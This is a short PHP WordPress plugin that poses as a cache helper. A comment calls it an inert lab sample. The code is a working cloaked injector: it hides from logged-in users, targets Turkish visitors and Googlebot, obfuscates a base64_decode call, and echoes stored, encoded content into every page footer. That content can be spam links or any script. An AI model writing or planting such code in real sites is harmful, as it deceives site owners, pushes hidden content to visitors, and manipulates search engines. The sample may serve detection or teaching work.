<?php
/*
Plugin Name: WP Cache Helper
Description: Object cache compatibility layer.
Version: 2.4.1
*/
// LAB SAMPLE (inert): mimics a real cloaked spam injector. It only prints links
// stored in an option; nothing here runs code supplied from outside.

add_action('wp_footer', function () {
    if (is_user_logged_in()) {
        return; // the owner never sees it
    }
    $cc = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? $_SERVER['HTTP_CF_IPCOUNTRY'] : '';
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    if ($cc !== 'TR' && stripos($ua, 'googlebot') === false) {
        return;
    }
    $d = get_option('wpch_blocks');
    if ($d) {
        $f = strrev('edoced_46esab');
        echo $f($d);
    }
}, 99);
